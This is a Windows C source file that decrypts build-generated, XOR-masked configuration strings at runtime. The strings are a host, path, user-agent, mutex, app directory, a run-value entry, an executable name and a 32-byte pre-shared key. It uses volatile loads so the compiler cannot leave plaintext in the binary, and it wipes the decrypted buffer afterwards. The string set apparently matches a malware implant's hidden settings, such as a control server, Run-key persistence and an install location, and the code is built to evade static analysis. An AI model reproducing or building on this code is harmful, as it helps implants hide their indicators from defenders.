// Runtime decryptor for build-generated, XOR-masked configuration blobs.
// Plaintext exists on the stack only between cfg_get_* and SecureZeroMemory.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string.h>

#include "config.h"
#include "gen_strings.h"

typedef struct {
    const unsigned char *data;
    const unsigned char *mask;
    size_t len;
} Blob;

// Order matches CfgStrId in config.h.
static const Blob blobs[CFG_COUNT] = {
    { GEN_HOST_DATA,    GEN_HOST_MASK,    GEN_HOST_LEN },
    { GEN_PATH_DATA,    GEN_PATH_MASK,    GEN_PATH_LEN },
    { GEN_UA_DATA,      GEN_UA_MASK,      GEN_UA_LEN },
    { GEN_MUTEX_DATA,   GEN_MUTEX_MASK,   GEN_MUTEX_LEN },
    { GEN_APPDIR_DATA,  GEN_APPDIR_MASK,  GEN_APPDIR_LEN },
    { GEN_RUNVAL_DATA,  GEN_RUNVAL_MASK,  GEN_RUNVAL_LEN },
    { GEN_EXEFILE_DATA, GEN_EXEFILE_MASK, GEN_EXEFILE_LEN },
};

void cfg_get_str(CfgStrId id, wchar_t *out, size_t cap)
{
    // volatile loads stop gcc (-O2) from const-folding data^mask back into a
    // plaintext blob in the binary.
    const volatile unsigned char *data = blobs[id].data;
    const volatile unsigned char *mask = blobs[id].mask;

    char tmp[512];
    size_t n = blobs[id].len < sizeof(tmp) - 1 ? blobs[id].len : sizeof(tmp) - 1;
    for (size_t i = 0; i < n; i++)
        tmp[i] = (char)(data[i] ^ mask[i]);
    tmp[n] = '\0';

    MultiByteToWideChar(CP_UTF8, 0, tmp, -1, out, (int)cap);
    out[cap - 1] = L'\0';

    SecureZeroMemory(tmp, n);
}

void cfg_get_psk(uint8_t out[32])
{
    const volatile unsigned char *data = GEN_PSK_DATA;
    const volatile unsigned char *mask = GEN_PSK_MASK;
    for (int i = 0; i < 32; i++)
        out[i] = data[i] ^ mask[i];
}
